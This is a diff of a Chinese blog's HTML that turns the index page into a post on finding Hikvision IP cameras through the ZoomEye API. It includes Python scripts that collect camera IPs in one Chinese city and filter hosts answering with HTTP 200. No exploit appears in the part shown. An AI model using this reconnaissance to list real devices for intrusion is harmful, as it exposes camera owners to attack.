@@ -86,7 +86,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Python,渗透测试," />
 
 
 
@@ -104,16 +104,18 @@
 
 
 
-<meta name="description" content="人总是需要有一些莫名其妙坚持的">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hiro WANG&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta name="description" content="ZoomEye 正是一个检索网络空间节点的搜索引擎。能够通过设备类型、固件版本、分布地点、开放端口服务等信息进行主机发现，同样也可以使用Shodan进行搜索，ZoomEye目前侧重于Web层面的资产发现而Shodan则侧重于主机层面。">
+<meta name="keywords" content="Python,渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用ZoomEye快速查找Hikvision网络摄像头">
+<meta property="og:url" content="http://yoursite.com/2017/09/01/利用ZoomEye快速查找Hikvision网络摄像头/index.html">
 <meta property="og:site_name" content="Hiro WANG&#39;s Blog">
-<meta property="og:description" content="人总是需要有一些莫名其妙坚持的">
+<meta property="og:description" content="ZoomEye 正是一个检索网络空间节点的搜索引擎。能够通过设备类型、固件版本、分布地点、开放端口服务等信息进行主机发现，同样也可以使用Shodan进行搜索，ZoomEye目前侧重于Web层面的资产发现而Shodan则侧重于主机层面。">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-09-01T11:34:35.543Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hiro WANG&#39;s Blog">
-<meta name="twitter:description" content="人总是需要有一些莫名其妙坚持的">
+<meta name="twitter:title" content="利用ZoomEye快速查找Hikvision网络摄像头">
+<meta name="twitter:description" content="ZoomEye 正是一个检索网络空间节点的搜索引擎。能够通过设备类型、固件版本、分布地点、开放端口服务等信息进行主机发现，同样也可以使用Shodan进行搜索，ZoomEye目前侧重于Web层面的资产发现而Shodan则侧重于主机层面。">
 
 
 
@@ -143,13 +145,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/09/01/利用ZoomEye快速查找Hikvision网络摄像头/"/>
 
 
 
 
 
-  <title>Hiro WANG's Blog</title>
+  <title>利用ZoomEye快速查找Hikvision网络摄像头 | Hiro WANG's Blog</title>
   
 
 
@@ -168,8 +170,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -306,545 +307,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/06/OP-TEE系列之-三-如何新建一个TA程序/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Hiro WANG's Blog">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hiro WANG's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/06/OP-TEE系列之-三-如何新建一个TA程序/" itemprop="url">OP-TEE系列之(三)如何新建一个TA程序</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-06T22:01:54+08:00">
-                2017-09-06
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/OP-TEE/" itemprop="url" rel="index">
-                    <span itemprop="name">OP-TEE</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/09/06/OP-TEE系列之-三-如何新建一个TA程序/" class="leancloud_visitors" data-flag-title="OP-TEE系列之(三)如何新建一个TA程序">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  467 字
-                </span>
-              
-
-              
-
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          一、如何新建一个TA程序1、参考Hello World Trusted Application（*）2、定义UUID和功能ID（ta / include / ta_hello_world.h）3、在（ta / hello_world_ta.c）中实现函数4、在Linux（host/ hello_wo
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/09/06/OP-TEE系列之-三-如何新建一个TA程序/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/05/OP-TEE系列之-二-Hello-world示例程序讲解/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Hiro WANG's Blog">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hiro WANG's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/05/OP-TEE系列之-二-Hello-world示例程序讲解/" itemprop="url">OP-TEE系列之(二)Hello-world示例程序讲解</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-05T21:46:45+08:00">
-                2017-09-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/OP-TEE/" itemprop="url" rel="index">
-                    <span itemprop="name">OP-TEE</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/09/05/OP-TEE系列之-二-Hello-world示例程序讲解/" class="leancloud_visitors" data-flag-title="OP-TEE系列之(二)Hello-world示例程序讲解">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  564 字
-                </span>
-              
-
-              
-
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          
-系列一中实现了QEMU虚拟机中的OP-TEE环境搭建，对于如何直观的理解OP-TEE的文件系统，本文中通过对其中集成的Hello_world示例进行分析，讲解Hello_world的运行流程。
-本文系一边查阅资料一边记录而成，有错误之处欢迎指出
-
-Hello_world文件目录安装好OP-TEE环
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/09/05/OP-TEE系列之-二-Hello-world示例程序讲解/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/01/Intel-SGX-ARM-TrustZone等技术简介与分析入门/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Hiro WANG's Blog">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hiro WANG's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/01/Intel-SGX-ARM-TrustZone等技术简介与分析入门/" itemprop="url">Intel SGX ARM TrustZone等技术简介与分析入门</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-01T20:36:23+08:00">
-                2017-09-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/可信计算/" itemprop="url" rel="index">
-                    <span itemprop="name">可信计算</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/09/01/Intel-SGX-ARM-TrustZone等技术简介与分析入门/" class="leancloud_visitors" data-flag-title="Intel SGX ARM TrustZone等技术简介与分析入门">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  2,848 字
-                </span>
-              
-
-              
-
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>Intel’s SGX, ARM’s TrustZone, Apple’s Secure Enclave, and IBM SecureBlue<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/09/01/Intel-SGX-ARM-TrustZone等技术简介与分析入门/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
 
   
 
@@ -874,9 +339,7 @@ Hello_world文件目录安装好OP-TEE环
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/01/利用ZoomEye快速查找Hikvision网络摄像头/" itemprop="url">利用ZoomEye快速查找Hikvision网络摄像头</a></h1>
+          <h1 class="post-title" itemprop="name headline">利用ZoomEye快速查找Hikvision网络摄像头</h1>
         
 
         <div class="post-meta">
@@ -964,181 +427,9 @@ Hello_world文件目录安装好OP-TEE环
           
 
           
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          ZoomEye 正是一个检索网络空间节点的搜索引擎。能够通过设备类型、固件版本、分布地点、开放端口服务等信息进行主机发现，同样也可以使用Shodan进行搜索，ZoomEye目前侧重于Web层面的资产发现而Shodan则侧重于主机层面。
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/09/01/利用ZoomEye快速查找Hikvision网络摄像头/">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/28/Ubuntu-17-04-Snort-2-9-9-0-Barnyard2-PulledPork-BASE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Hiro WANG's Blog">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hiro WANG's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/08/28/Ubuntu-17-04-Snort-2-9-9-0-Barnyard2-PulledPork-BASE/" itemprop="url">Ubuntu 17.04 + Snort 2.9.9.0 + Barnyard2 + PulledPork + BASE</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-28T18:07:58+08:00">
-                2017-08-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/入侵检测/" itemprop="url" rel="index">
-                    <span itemprop="name">入侵检测</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/08/28/Ubuntu-17-04-Snort-2-9-9-0-Barnyard2-PulledPork-BASE/" class="leancloud_visitors" data-flag-title="Ubuntu 17.04 + Snort 2.9.9.0 + Barnyard2 + PulledPork + BASE">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  380 字
-                </span>
-              
-
-              
-
-              
-            </div>
-          
-
+              <div class="post-description">
+                  ZoomEye 正是一个检索网络空间节点的搜索引擎。能够通过设备类型、固件版本、分布地点、开放端口服务等信息进行主机发现，同样也可以使用Shodan进行搜索，ZoomEye目前侧重于Web层面的资产发现而Shodan则侧重于主机层面。
+              </div>
           
 
         </div>
@@ -1154,17 +445,12 @@ Hello_world文件目录安装好OP-TEE环
       
 
       
-        
-          <p>官方提供了详细的环境搭建指导，建议参照Snort 2.9.9.x on Ubuntu 14 and 16.PDF自己动手安装，对工具有个粗略的了解<br></p>
-<p>Ubuntu 17.04 + Snort 2.9.9.0 + Barnyard2 + PulledPork + BASE<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/08/28/Ubuntu-17-04-Snort-2-9-9-0-Barnyard2-PulledPork-BASE/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+        <p>学习阶段的一次记录，时间久远，部分文字描述可能有误。</p>
+<h2 id="Step-1-利用搜索引擎批量发现网络摄像头"><a href="#Step-1-利用搜索引擎批量发现网络摄像头" class="headerlink" title="Step 1:利用搜索引擎批量发现网络摄像头"></a>Step 1:利用搜索引擎批量发现网络摄像头</h2><p>ZoomEye 正是一个检索网络空间节点的搜索引擎。能够通过设备类型、固件版本、分布地点、开放端口服务等信息进行主机发现，同样也可以使用Shodan进行搜索，ZoomEye目前侧重于Web层面的资产发现而Shodan则侧重于主机层面。<br>直接粘贴代码，需要动手的部分只有API参数的更改。在WEB页面进行搜索尝试，根据所查结果配置API参数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string">@version: ??</span></div><div class="line"><span class="string">@author: hiro086</span></div><div class="line"><span class="string">@contact: wangzw@nuaa.edu.cn</span></div><div class="line"><span class="string">@file: spider_main.py</span></div><div class="line"><span class="string">@time: 17/6/28 下午4:07</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">access_token = <span class="string">''</span></div><div class="line">ip_list = []</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></div><div class="line">    user = raw_input(<span class="string">'[username]:'</span>)<span class="comment">#email</span></div><div class="line">    passwd = raw_input(<span class="string">'[password]:'</span>)</div><div class="line">    data = &#123;</div><div class="line">        <span class="string">'username'</span>:user,</div><div class="line">        <span class="string">'password'</span>:passwd,</div><div class="line">    &#125;</div><div class="line">    data_encoded = json.dumps(data)<span class="comment">#dumps是将dict转化成str格式，loads是将str转化成dict格式。</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        r = requests.post(url = <span class="string">'https://api.zoomeye.org/user/login'</span>,data = data_encoded)</div><div class="line">        r_decoded = json.loads(r.text)</div><div class="line">        <span class="keyword">global</span>  access_token</div><div class="line">        access_token = r_decoded[<span class="string">'access_token'</span>]</div><div class="line"></div><div class="line">    <span class="keyword">except</span> Exception:</div><div class="line">        <span class="keyword">print</span> <span class="string">'[info]:username or password is wrong'</span></div><div class="line">        exit()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">savaStrToFile</span><span class="params">(file,str)</span>:</span></div><div class="line">    <span class="keyword">with</span> open(file,<span class="string">'w'</span>) <span class="keyword">as</span> output:</div><div class="line">        output.write(str)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">savaListToFile</span><span class="params">(file,list)</span>:</span></div><div class="line">    s = <span class="string">'\n'</span>.join(list)</div><div class="line">    <span class="keyword">with</span> open(file,<span class="string">'w'</span>) <span class="keyword">as</span> output:</div><div class="line">        output.write(s)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">apiTest</span><span class="params">()</span>:</span></div><div class="line">    page = <span class="number">1</span></div><div class="line">    <span class="keyword">global</span> access_token</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'access_token.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> input:</div><div class="line">        access_token = input.read()</div><div class="line">    headers = &#123;<span class="string">'Authorization'</span>: unicode(<span class="string">'JWT '</span> + access_token, <span class="string">"UTF-8"</span>),&#125; <span class="comment"># 请求头以此来说明你有调用api的权限</span></div><div class="line">    <span class="keyword">print</span> headers</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            r = requests.get(url=<span class="string">"https://api.zoomeye.org/host/search?query=app:Hikvision IP camera httpd port:80 country:China country:China city:Guiyang &amp;page="</span> + str(page),headers = headers)</div><div class="line">            r_decoded = json.loads(r.text)</div><div class="line">            <span class="keyword">print</span></div><div class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> r_decoded[<span class="string">'matches'</span>]:</div><div class="line">                resStr = x[<span class="string">'ip'</span>]</div><div class="line">                 <span class="comment">#         + ':' + str(x['portinfo']['port'])+ '\t' + '[geoinfo]:'  +\</span></div><div class="line">                 <span class="comment"># x['geoinfo']['city']['names']['en'] + ' ' + x['geoinfo']['country']['names']['en']+'\t' +\</span></div><div class="line">                 <span class="comment"># '[lat-lon]:' + str(x['geoinfo']['location']['lat']) +' '+ str(x['geoinfo']['location']['lon'])</span></div><div class="line"></div><div class="line">                <span class="comment"># 我在此保存的信息有点多，仅供参考,注意字典中键值的类型，json格式参考下图</span></div><div class="line">                <span class="keyword">print</span> resStr</div><div class="line">                ip_list.append(resStr)</div><div class="line">            <span class="keyword">print</span> <span class="string">'[info]count'</span> + str(page * <span class="number">10</span>) <span class="comment">#每页10ip</span></div><div class="line">        <span class="keyword">except</span> Exception,e:</div><div class="line">            <span class="keyword">if</span> str(e.message) == <span class="string">'matches'</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'[info]:'</span> + <span class="string">'account was break, exceeding the max limitations'</span></div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'[info]:'</span> + str(e.message)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">if</span> page == <span class="number">50</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">            page += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(<span class="string">'access_token.txt'</span>):</div><div class="line">        <span class="keyword">print</span> <span class="string">'[info]:access_token file is not exist, please login'</span></div><div class="line">        login()</div><div class="line">        savaStrToFile(<span class="string">'access_token.txt'</span>,access_token)</div><div class="line">    apiTest()</div><div class="line">    savaListToFile(<span class="string">'ip_list1.txt'</span>,ip_list)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<h2 id="Step-2-提取IP信息"><a href="#Step-2-提取IP信息" class="headerlink" title="Step 2:提取IP信息"></a>Step 2:提取IP信息</h2><p>这部分比较简单，根据返回的信息提取IP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string">@version: ??</span></div><div class="line"><span class="string">@author: hiro086</span></div><div class="line"><span class="string">@contact: wangzw@nuaa.edu.cn</span></div><div class="line"><span class="string">@file: extract_msg.py</span></div><div class="line"><span class="string">@time: 17/6/29 下午5:06</span></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Threads</span><span class="params">()</span>:</span></div><div class="line">    threadlist = []</div><div class="line">    queue = Queue.Queue()</div><div class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> open(<span class="string">'result1.txt'</span>,<span class="string">'r'</span>):</div><div class="line">        queue.put(ip.replace(<span class="string">'\n'</span>,<span class="string">''</span>))</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</div><div class="line">        th = threading.Thread(target=pri_lines,args=(queue,))</div><div class="line">        threadlist.append(th)</div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</div><div class="line">        t.start()</div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</div><div class="line">        t.join()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pri_lines</span><span class="params">(queue)</span>:</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> queue.empty():</div><div class="line">        lines = queue.get()</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            lines = lines.strip()</div><div class="line">            <span class="keyword">if</span> lines.endswith(<span class="string">' 200'</span>):</div><div class="line">                <span class="keyword">print</span> lines</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"Extract message ..."</span></div><div class="line">    Threads()</div></pre></td></tr></table></figure></p>
